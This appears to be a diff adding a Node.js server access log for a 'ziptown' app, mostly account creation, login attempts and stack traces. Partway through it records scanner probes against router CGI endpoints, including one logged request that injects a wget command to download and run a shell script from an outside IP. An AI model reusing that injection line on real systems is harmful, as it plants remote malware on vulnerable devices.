@@ -1,0 +1,536 @@
+listening on port 9000
+listening on port 9000
+  <-- GET /
+  --> GET / 200 8ms 51b
+  <-- GET /
+  --> GET / 200 1ms 51b
+  <-- GET /
+  --> GET / 200 1ms 51b
+  <-- GET /favicon.ico
+  --> GET /favicon.ico 404 1ms -
+  <-- GET /
+  --> GET / 200 1ms 51b
+  <-- GET /
+  --> GET / 200 1ms 51b
+  <-- GET /
+  --> GET / 200 1ms 51b
+  <-- GET /ziptown/app/offers
+connected
+  --> GET /ziptown/app/offers 200 694ms 2b
+  <-- GET /ziptown/app/offers?city=%22Durbane%22
+connected
+  --> GET /ziptown/app/offers?city=%22Durbane%22 200 464ms 2b
+  <-- GET /ziptown/app/offers?city=%22Durbane%22
+connected
+  --> GET /ziptown/app/offers?city=%22Durbane%22 200 488ms 2b
+  <-- GET /ziptown/app/offers?city=%22Durbane%22
+connected
+  --> GET /ziptown/app/offers?city=%22Durbane%22 200 595ms 2b
+  <-- GET /ziptown/app/offers?city=%22Durbane%22
+connected
+  --> GET /ziptown/app/offers?city=%22Durbane%22 200 489ms 2b
+  <-- GET /ziptown/app/offers?city=Durbane
+connected
+  --> GET /ziptown/app/offers?city=Durbane 200 556ms 303b
+  <-- GET /ziptown/app/offers?city=Durbane
+connected
+  --> GET /ziptown/app/offers?city=Durbane 200 1,394ms 303b
+  <-- GET /favicon.ico
+  --> GET /favicon.ico 404 1ms -
+  <-- GET /
+  --> GET / 200 1ms 51b
+  <-- POST /ziptown/account/create
+connected
+connected
+(node:24631) DeprecationWarning: collection.findAndModify is deprecated. Use findOneAndUpdate, findOneAndReplace or findOneAndDelete instead.
+begin Inserting
+connected
+(node:24631) DeprecationWarning: collection.insert is deprecated. Use insertOne, insertMany or bulkWrite instead.
+Done Inserting
+  --> POST /ziptown/account/create 200 1,702ms 57b
+  <-- GET /
+  --> GET / 200 1ms 51b
+  <-- POST /ziptown/ziptown/account/create
+  --> POST /ziptown/ziptown/account/create 404 1ms -
+  <-- POST /ziptown/account/create
+  --> POST /ziptown/account/create 200 1ms 67b
+  <-- POST /ziptown/account/create
+  --> POST /ziptown/account/create 200 1ms 67b
+  <-- POST /ziptown/account/create
+  --> POST /ziptown/account/create 200 1ms 67b
+  <-- POST /ziptown/account/create
+connected
+  --> POST /ziptown/account/create 200 700ms 53b
+  <-- POST /ziptown/account/create
+connected
+  --> POST /ziptown/account/create 200 655ms 53b
+  <-- POST /ziptown/account/create
+connected
+  --> POST /ziptown/account/create 200 628ms 53b
+  <-- POST /ziptown/account/create
+connected
+  --> POST /ziptown/account/create 200 537ms 53b
+  <-- POST /ziptown/account/create
+connected
+  --> POST /ziptown/account/create 200 646ms 53b
+  <-- POST /ziptown/account/create
+  xxx POST /ziptown/account/create 400 1ms -
+
+  Error: invalid JSON, only supports object and array
+      at parse (/home/ubuntu/ziptown/source/zipTownServer/node_modules/co-body/lib/json.js:60:13)
+      at /home/ubuntu/ziptown/source/zipTownServer/node_modules/co-body/lib/json.js:45:22
+      at <anonymous>
+      at process._tickCallback (internal/process/next_tick.js:189:7)
+
+  <-- POST /ziptown/account/create
+connected
+  --> POST /ziptown/account/create 200 584ms 53b
+  <-- POST /ziptown/account/create
+connected
+  --> POST /ziptown/account/create 200 571ms 53b
+  <-- POST /ziptown/account/create
+connected
+  --> POST /ziptown/account/create 200 565ms 53b
+  <-- POST /ziptown/account/create
+connected
+  --> POST /ziptown/account/create 200 597ms 53b
+  <-- POST /ziptown/account/create
+connected
+  --> POST /ziptown/account/create 200 594ms 53b
+  <-- POST /ziptown/account/create
+connected
+  --> POST /ziptown/account/create 200 596ms 53b
+  <-- POST /ziptown/account/create
+connected
+connected
+begin Inserting
+connected
+Done Inserting
+  --> POST /ziptown/account/create 200 1,602ms 57b
+  <-- POST /ziptown/account/create
+connected
+  --> POST /ziptown/account/create 200 518ms 53b
+  <-- POST /ziptown/account/create
+connected
+  --> POST /ziptown/account/create 200 612ms 53b
+  <-- POST /ziptown/account/create
+connected
+  --> POST /ziptown/account/create 200 517ms 53b
+  <-- POST /ziptown/account/login
+connected
+connected
+  xxx POST /ziptown/account/login 500 1,184ms -
+
+  TypeError: Cannot read property 'password' of undefined
+      at Object.authenticateUser (/home/ubuntu/ziptown/source/zipTownServer/controllers/auth.js:36:64)
+      at <anonymous>
+      at process._tickCallback (internal/process/next_tick.js:189:7)
+
+  <-- POST /ziptown/account/login
+connected
+connected
+  xxx POST /ziptown/account/login 500 977ms -
+
+  TypeError: Cannot read property 'password' of undefined
+      at Object.authenticateUser (/home/ubuntu/ziptown/source/zipTownServer/controllers/auth.js:36:64)
+      at <anonymous>
+      at process._tickCallback (internal/process/next_tick.js:189:7)
+
+  <-- POST /ziptown/account/login
+connected
+connected
+  xxx POST /ziptown/account/login 500 1,061ms -
+
+  TypeError: Cannot read property 'password' of undefined
+      at Object.authenticateUser (/home/ubuntu/ziptown/source/zipTownServer/controllers/auth.js:36:64)
+      at <anonymous>
+      at process._tickCallback (internal/process/next_tick.js:189:7)
+
+  <-- POST /ziptown/account/login
+connected
+connected
+  xxx POST /ziptown/account/login 500 975ms -
+
+  TypeError: Cannot read property 'password' of undefined
+      at Object.authenticateUser (/home/ubuntu/ziptown/source/zipTownServer/controllers/auth.js:36:64)
+      at <anonymous>
+      at process._tickCallback (internal/process/next_tick.js:189:7)
+
+  <-- POST /ziptown/account/login
+connected
+connected
+  xxx POST /ziptown/account/login 500 1,129ms -
+
+  TypeError: Cannot read property 'password' of undefined
+      at Object.authenticateUser (/home/ubuntu/ziptown/source/zipTownServer/controllers/auth.js:36:64)
+      at <anonymous>
+      at process._tickCallback (internal/process/next_tick.js:189:7)
+
+  <-- POST /ziptown/account/login
+connected
+connected
+  xxx POST /ziptown/account/login 500 1,091ms -
+
+  TypeError: Cannot read property 'password' of undefined
+      at Object.authenticateUser (/home/ubuntu/ziptown/source/zipTownServer/controllers/auth.js:36:64)
+      at <anonymous>
+      at process._tickCallback (internal/process/next_tick.js:189:7)
+
+  <-- GET /
+  --> GET / 200 2ms 51b
+listening on port 9000
+  <-- GET /ziptown/account/user/13
+connected
+connected
+connected
+  --> GET /ziptown/account/user/13 200 1,201ms 3.13kb
+  <-- GET /ziptown/account/user/13
+connected
+connected
+connected
+  --> GET /ziptown/account/user/13 200 980ms 3.13kb
+  <-- POST /ziptown/account/create
+connected
+connected
+(node:24958) DeprecationWarning: collection.findAndModify is deprecated. Use findOneAndUpdate, findOneAndReplace or findOneAndDelete instead.
+begin Inserting
+connected
+(node:24958) DeprecationWarning: collection.insert is deprecated. Use insertOne, insertMany or bulkWrite instead.
+Done Inserting
+  --> POST /ziptown/account/create 200 1,819ms 57b
+listening on port 9000
+  <-- POST /ziptown/account/create
+connected
+connected
+(node:25087) DeprecationWarning: collection.findAndModify is deprecated. Use findOneAndUpdate, findOneAndReplace or findOneAndDelete instead.
+begin Inserting
+connected
+(node:25087) DeprecationWarning: collection.insert is deprecated. Use insertOne, insertMany or bulkWrite instead.
+Done Inserting
+connected
+connected
+connected
+  --> POST /ziptown/account/create 200 2,796ms 207b
+  <-- GET /
+  --> GET / 200 2ms 51b
+  <-- GET /
+  --> GET / 200 0ms 51b
+  <-- GET /
+  --> GET / 200 0ms 51b
+  <-- GET /
+  --> GET / 200 1ms 51b
+  <-- GET /
+  --> GET / 200 1ms 51b
+  <-- GET /
+  --> GET / 200 1ms 51b
+  <-- GET /
+  --> GET / 200 1ms 51b
+  <-- GET /index.do
+  --> GET /index.do 404 2ms -
+  <-- GET /index.action
+  --> GET /index.action 404 1ms -
+  <-- GET /index.jsp
+  --> GET /index.jsp 404 1ms -
+  <-- GET /login.do
+  --> GET /login.do 404 1ms -
+  <-- GET /login.action
+  --> GET /login.action 404 1ms -
+  <-- GET /login.jsp
+  --> GET /login.jsp 404 1ms -
+  <-- GET /main.jsp
+  --> GET /main.jsp 404 2ms -
+  <-- GET /default.jsp
+  --> GET /default.jsp 404 1ms -
+  <-- GET /register.jsp
+  --> GET /register.jsp 404 1ms -
+  <-- GET /login/login.jsp
+  --> GET /login/login.jsp 404 1ms -
+  <-- GET /login/indexAction.action
+  --> GET /login/indexAction.action 404 0ms -
+  <-- GET /indexAction.action
+  --> GET /indexAction.action 404 1ms -
+  <-- GET /
+  --> GET / 200 0ms 51b
+  <-- GET /
+  --> GET / 200 0ms 51b
+  <-- GET /
+  --> GET / 200 1ms 51b
+  <-- HEAD /
+  --> HEAD / 200 1ms 51b
+  <-- GET /
+  --> GET / 200 1ms 51b
+  <-- GET /
+  --> GET / 200 1ms 51b
+  <-- GET /
+  --> GET / 200 1ms 51b
+  <-- GET /
+  --> GET / 200 1ms 51b
+  <-- GET /
+  --> GET / 200 1ms 51b
+  <-- GET /
+  --> GET / 200 1ms 51b
+  <-- GET /
+  --> GET / 200 0ms 51b
+  <-- GET /
+  --> GET / 200 1ms 51b
+  <-- GET /
+  --> GET / 200 1ms 51b
+  <-- GET /
+  --> GET / 200 0ms 51b
+  <-- POST /tmUnblock.cgi
+
+  Error: Parse Error
+      at socketOnEnd (_http_server.js:446:20)
+      at emitNone (events.js:111:20)
+      at Socket.emit (events.js:208:7)
+      at endReadableNT (_stream_readable.js:1064:12)
+      at _combinedTickCallback (internal/process/next_tick.js:139:11)
+      at process._tickCallback (internal/process/next_tick.js:181:9)
+
+  xxx POST /tmUnblock.cgi 400 3ms -
+  <-- GET /tmUnblock.cgi
+  --> GET /tmUnblock.cgi 404 1ms -
+  <-- POST /tmBlock.cgi
+
+  Error: Parse Error
+      at socketOnEnd (_http_server.js:446:20)
+      at emitNone (events.js:111:20)
+      at Socket.emit (events.js:208:7)
+      at endReadableNT (_stream_readable.js:1064:12)
+      at _combinedTickCallback (internal/process/next_tick.js:139:11)
+      at process._tickCallback (internal/process/next_tick.js:181:9)
+
+  xxx POST /tmBlock.cgi 400 1ms -
+  <-- GET /tmBlock.cgi
+  --> GET /tmBlock.cgi 404 0ms -
+  <-- POST /hndBlock.cgi
+
+  Error: Parse Error
+      at socketOnEnd (_http_server.js:446:20)
+      at emitNone (events.js:111:20)
+      at Socket.emit (events.js:208:7)
+      at endReadableNT (_stream_readable.js:1064:12)
+      at _combinedTickCallback (internal/process/next_tick.js:139:11)
+      at process._tickCallback (internal/process/next_tick.js:181:9)
+
+  xxx POST /hndBlock.cgi 400 0ms -
+  <-- GET /hndBlock.cgi
+  --> GET /hndBlock.cgi 404 0ms -
+  <-- POST /hndUnblock.cgi
+
+  Error: Parse Error
+      at socketOnEnd (_http_server.js:446:20)
+      at emitNone (events.js:111:20)
+      at Socket.emit (events.js:208:7)
+      at endReadableNT (_stream_readable.js:1064:12)
+      at _combinedTickCallback (internal/process/next_tick.js:139:11)
+      at process._tickCallback (internal/process/next_tick.js:181:9)
+
+  xxx POST /hndUnblock.cgi 400 1ms -
+  <-- POST /hndUnblock.cgi
+
+  Error: Parse Error
+      at socketOnEnd (_http_server.js:446:20)
+      at emitNone (events.js:111:20)
+      at Socket.emit (events.js:208:7)
+      at endReadableNT (_stream_readable.js:1064:12)
+      at _combinedTickCallback (internal/process/next_tick.js:139:11)
+      at process._tickCallback (internal/process/next_tick.js:181:9)
+
+  xxx POST /hndUnblock.cgi 400 0ms -
+  <-- POST /board.cgi
+
+  Error: Parse Error
+      at socketOnEnd (_http_server.js:446:20)
+      at emitNone (events.js:111:20)
+      at Socket.emit (events.js:208:7)
+      at endReadableNT (_stream_readable.js:1064:12)
+      at _combinedTickCallback (internal/process/next_tick.js:139:11)
+      at process._tickCallback (internal/process/next_tick.js:181:9)
+
+  xxx POST /board.cgi 400 1ms -
+  <-- POST /command.php
+
+  Error: Parse Error
+      at socketOnEnd (_http_server.js:446:20)
+      at emitNone (events.js:111:20)
+      at Socket.emit (events.js:208:7)
+      at endReadableNT (_stream_readable.js:1064:12)
+      at _combinedTickCallback (internal/process/next_tick.js:139:11)
+      at process._tickCallback (internal/process/next_tick.js:181:9)
+
+  xxx POST /command.php 400 0ms -
+  <-- POST /web/cgi-bin/usbinteract.cgi
+
+  Error: Parse Error
+      at socketOnEnd (_http_server.js:446:20)
+      at emitNone (events.js:111:20)
+      at Socket.emit (events.js:208:7)
+      at endReadableNT (_stream_readable.js:1064:12)
+      at _combinedTickCallback (internal/process/next_tick.js:139:11)
+      at process._tickCallback (internal/process/next_tick.js:181:9)
+
+  xxx POST /web/cgi-bin/usbinteract.cgi 400 0ms -
+  <-- POST /u/jsp/tools/exec.jsp
+
+  Error: Parse Error
+      at socketOnEnd (_http_server.js:446:20)
+      at emitNone (events.js:111:20)
+      at Socket.emit (events.js:208:7)
+      at endReadableNT (_stream_readable.js:1064:12)
+      at _combinedTickCallback (internal/process/next_tick.js:139:11)
+      at process._tickCallback (internal/process/next_tick.js:181:9)
+
+  xxx POST /u/jsp/tools/exec.jsp 400 1ms -
+  <-- POST /cgi-bin/cgi_system?cmd=saveconfig
+
+  Error: Parse Error
+      at socketOnEnd (_http_server.js:446:20)
+      at emitNone (events.js:111:20)
+      at Socket.emit (events.js:208:7)
+      at endReadableNT (_stream_readable.js:1064:12)
+      at _combinedTickCallback (internal/process/next_tick.js:139:11)
+      at process._tickCallback (internal/process/next_tick.js:181:9)
+
+  xxx POST /cgi-bin/cgi_system?cmd=saveconfig 400 1ms -
+  <-- POST /HNAP1
+  --> POST /HNAP1 404 1ms -
+  <-- POST /HNAP
+  --> POST /HNAP 404 1ms -
+  <-- GET /login.cgi?cli=aa%20aa%27;wget%20http://185.101.107.148/neko.sh%20-O%20-%3E%20/tmp/neko.sh;sh%20/tmp/neko.sh%27$
+  --> GET /login.cgi?cli=aa%20aa%27;wget%20http://185.101.107.148/neko.sh%20-O%20-%3E%20/tmp/neko.sh;sh%20/tmp/neko.sh%27$ 404 0ms -
+  <-- POST /GponForm/diag_Form?images/
+
+  Error: Parse Error
+
+  -x- POST /GponForm/diag_Form?images/ 404 0ms -
+  <-- GET /
+  --> GET / 200 0ms 51b
+  <-- GET /
+  --> GET / 200 1ms 51b
+  <-- GET /
+  --> GET / 200 1ms 51b
+  <-- GET /
+  --> GET / 200 1ms 51b
+  <-- GET http://5.188.210.12/echo.php
+  --> GET http://5.188.210.12/echo.php 404 1ms -
+  <-- POST /ziptown/account/create
+connected
+  --> POST /ziptown/account/create 200 582ms 53b
+  <-- POST /ziptown/account/create
+connected
+connected
+begin Inserting
+connected
+Done Inserting
+connected
+connected
+connected
+  --> POST /ziptown/account/create 200 2,630ms 206b
+  <-- GET /ziptown/account/user/13
+connected
+connected
+connected
+  --> GET /ziptown/account/user/13 200 1,157ms 3.13kb
+  <-- GET /
+  --> GET / 200 1ms 51b
+  <-- GET /
+  --> GET / 200 0ms 51b
+  <-- GET /
+  --> GET / 200 0ms 51b
+  <-- POST /ziptown/account/login
+connected
+connected
+connected
+connected
+  --> POST /ziptown/account/login 200 1,783ms 204b
+  <-- GET /.
+  --> GET /. 404 0ms -
+  <-- GET http://5.188.210.12/echo.php
+  --> GET http://5.188.210.12/echo.php 404 1ms -
+  <-- POST /ziptown/account/login
+connected
+connected
+connected
+connected
+  --> POST /ziptown/account/login 200 1,699ms 204b
+  <-- POST /ziptown/account/login
+connected
+connected
+connected
+connected
+  --> POST /ziptown/account/login 200 1,681ms 204b
+  <-- POST /ziptown/account/login
+connected
+connected
+connected
+connected
+  --> POST /ziptown/account/login 200 1,681ms 204b
+  <-- GET /
+  --> GET / 200 1ms 51b
+  <-- POST /ziptown/account/login
+connected
+connected
+connected
+connected
+  --> POST /ziptown/account/login 200 1,753ms 204b
+  <-- POST /ziptown/account/login
+connected
+connected
+connected
+connected
+  --> POST /ziptown/account/login 200 1,689ms 204b
+  <-- POST /ziptown/account/login
+connected
+connected
+connected
+connected
+  --> POST /ziptown/account/login 200 1,553ms 204b
+  <-- POST /ziptown/account/login
+connected
+connected
+connected
+connected
+  --> POST /ziptown/account/login 200 1,692ms 204b
+  <-- POST /ziptown/account/login
+connected
+connected
+connected
+connected
+  --> POST /ziptown/account/login 200 1,573ms 204b
+  <-- POST /ziptown/account/login
+connected
+connected
+connected
+connected
+  --> POST /ziptown/account/login 200 1,764ms 204b
+  <-- POST /ziptown/account/login
+connected
+connected
+connected
+connected
+  --> POST /ziptown/account/login 200 1,579ms 204b
+  <-- POST /ziptown/account/login
+connected
+connected
+connected
+connected
+  --> POST /ziptown/account/login 200 1,574ms 204b
+  <-- POST /ziptown/account/login
+connected
+connected
+connected
+connected
+  --> POST /ziptown/account/login 200 1,689ms 1.38kb
+  <-- POST /ziptown/account/login
+connected
+connected
+connected
+connected
+  --> POST /ziptown/account/login 200 1,607ms 1.38kb
+  <-- POST /ziptown/account/login
+connected
+connected
+connected
+connected
+  --> POST /ziptown/account/login 200 1,583ms 1.38kb
